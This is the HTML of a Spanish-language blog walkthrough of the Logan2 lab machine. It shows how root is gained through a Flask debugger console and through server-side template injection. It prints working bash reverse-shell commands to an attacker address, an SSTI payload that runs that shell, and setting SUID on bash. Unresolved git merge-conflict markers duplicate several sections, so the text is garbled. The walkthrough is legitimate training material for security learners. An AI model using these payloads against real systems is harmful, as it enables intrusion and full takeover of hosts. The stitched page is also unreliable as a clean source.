<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>meterpreter &gt; bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.1.17/443 0&gt;&amp;1&#34;
</span></span></code></pre></div><p>Una vez termino el tratamiento de la tty enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>git@logan2:$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries for git on logan2:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User git may run the following commands on logan2:
</span></span><span style="display:flex;"><span>    (ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
</span></span></code></pre></div><p>Al lanzar <code>app.py</code> crea un servidor web en python en el puerto <strong>8000</strong> y genera un pin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>git@logan2:~$ sudo /usr/bin/python3 /opt/app.py
</span></span><span style="display:flex;"><span> * Serving Flask app &#39;app&#39;
</span></span><span style="display:flex;"><span> * Debug mode: on
</span></span><span style="display:flex;"><span>WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
</span></span><span style="display:flex;"><span> * Running on all addresses (0.0.0.0)
</span></span><span style="display:flex;"><span> * Running on http://127.0.0.1:8000
</span></span><span style="display:flex;"><span> * Running on http://192.168.1.140:8000
</span></span><span style="display:flex;"><span>Press CTRL+C to quit
</span></span><span style="display:flex;"><span> * Restarting with stat
</span></span><span style="display:flex;"><span> * Debugger is active!
</span></span><span style="display:flex;"><span> * Debugger PIN: 768-889-478
</span></span></code></pre></div><p>Visualizo la web desde el navegador.</p>
<p><img src="/../machines/hmv/logan2/apppy8000.webp" alt="apppy8000"></p>
<p>Fuerza bruta de directorios.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ gobuster dir -u http://192.168.1.140:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>[+] Url:                     http://192.168.1.140:8000
</span></span><span style="display:flex;"><span>[+] Method:                  GET
</span></span><span style="display:flex;"><span>[+] Threads:                 10
</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>/console              (Status: 200) [Size: 1563]
</span></span><span style="display:flex;"><span>/test                 (Status: 200) [Size: 160]
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><h3 id="a-partir-de-aquí-hay-dos-formas-de-obtener-el-root">A partir de aquí hay dos formas de obtener el root</h3>
<h5 id="método-1">Método 1</h5>
<p>Me voy al directorio <strong>console</strong> y me aparece un panel para ingresar un pin, aquí introduzco el pin que anteriormente me ha generado <code>app.py</code>.</p>
<p><img src="/../machines/hmv/logan2/console.webp" alt="console"></p>
<p>Una vez  ingeso el pin me muestra una consola interactiva.</p>
<p><img src="/../machines/hmv/logan2/consoleready.webp" alt="consoleready"></p>
<p>Importo el modulo os y con chmod le doy permisos SUID al binario bash.</p>
<p><img src="/../machines/hmv/logan2/chmodbash.webp" alt="chmodbash"></p>
<p>Desde el usuario <strong>git</strong> obtengo el <strong>root</strong> de la siguiente forma.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">git@logan2:~$ bash -p
</span></span><span class="line"><span class="cl">bash-5.2# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><h5 id="método-2">Método 2</h5>
<p>Con curl visito el directorio <code>/test</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s 192.168.1.140:8000/test | html2text
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thank you None
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>git@logan2:~$ bash -p
</span></span><span style="display:flex;"><span>bash-5.2# whoami
</span></span><span style="display:flex;"><span>root
</span></span></code></pre></div><h5 id="método-2">Método 2</h5>
<p>Con curl visito el directorio <code>/test</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s 192.168.1.140:8000/test | html2text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Thank you None
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>En el código fuente de <strong>app.py</strong>  se puede ver  <code>@app.route(&quot;&quot;/test&quot;)</code> y el parámetro <strong>name</strong>.</p>
<p><img src="/../machines/hmv/logan2/stti.webp" alt="stti"></p>
<p>Detecto un <strong>SSTI</strong>.</p>
<p><img src="/../machines/hmv/logan2/stti49.webp" alt="stti49"></p>
<p>Para explotar la vulnerabilidad encuentro este recurso de  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread">PayLoadsAllTheThings</a> para obtener un RCE.</p>
<p><img src="/../machines/hmv/logan2/sttirce.webp" alt="sttirce"></p>
<p>Lanzo una shell de bash <code>URL-Encodeada</code> desde el navegador.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http://192.168.1.140:8000/test?name={{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.17%2F443%200%3E%261%22&#39;).read() }}
</span></span></code></pre></div><p>Y finalmente obtengo la shell de root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvp 443
</span></span><span class="line"><span class="cl">listening on [any] 443 ...
</span></span><span class="line"><span class="cl">connect to [192.168.1.17] from newsitelogan.logan.hmv [192.168.1.140] 52748
</span></span><span class="line"><span class="cl">root@logan2:/home/git# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>http://192.168.1.140:8000/test?name={{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.17%2F443%200%3E%261%22&#39;).read() }}
</span></span></code></pre></div><p>Y finalmente obtengo la shell de root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvp 443
</span></span><span style="display:flex;"><span>listening on [any] 443 ...
</span></span><span style="display:flex;"><span>connect to [192.168.1.17] from newsitelogan.logan.hmv [192.168.1.140] 52748
</span></span><span style="display:flex;"><span>root@logan2:/home/git# id
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><p>Y aquí termina la máquina Logan2.</p>
<p>Saludos!</p>

            </div>
<<<<<<< HEAD
        </article></main>
=======
        </article>
    </main>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2024 .
<<<<<<< HEAD
        
    </small>
</footer><a href="#" title="" id="totop">
=======
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    
<<<<<<< HEAD






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
=======
    
    
    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>


    </body>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</html>
